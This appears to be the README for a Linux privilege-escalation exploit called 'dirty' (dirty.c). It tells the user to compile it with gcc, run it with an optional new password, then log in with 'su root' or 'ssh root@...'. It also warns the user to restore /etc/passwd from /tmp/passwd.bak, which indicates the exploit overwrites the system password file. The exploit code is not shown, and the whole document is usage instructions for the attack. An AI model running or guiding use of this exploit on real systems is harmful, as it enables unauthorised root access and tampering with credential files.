# Dirty


Compile with:
 gcc -pthread dirty.c -o dirty -lcrypt

Then run the newly create binary by either doing:
  "./dirty" or "./dirty my-new-password"

Afterwards, you can either "su root" or "ssh root@..."

DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
  mv /tmp/passwd.bak /etc/passwd
